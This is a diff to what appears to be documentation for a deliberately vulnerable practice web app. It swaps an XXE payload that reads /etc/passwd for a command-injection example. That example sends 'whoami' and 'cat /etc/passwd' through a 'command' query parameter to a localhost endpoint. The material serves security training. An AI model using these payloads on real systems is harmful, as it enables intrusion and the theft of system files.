@@ -85,22 +85,12 @@ whoami
 cat /etc/passwd
 ```
 
-### XML External Entity Injection (XXE)
-XXE Injection allows for injection of XML entities to access or manipulate files on application.
-
-Path: `/process_xml`
-Methods: `POST`
+### Command Injection via API endpoint
+Path: `/endpoint`
+Methods: `GET`
 
 **Example**
 ```
-<!DOCTYPE foo [
-    <!ELEMENT foo ANY >
-    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
-]>
-<root>
-   <title>Test Title</title>
-    <description>&xxe;</description>
-</root>
+http://127.0.0.1/endpoint?command=whoami
+curl -s http://127.0.0.1:8000/endpoint?command=cat+/etc/passwd | jq -r '.status[]'
 ```
-
-Other resources: [XXE Cheatsheet](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
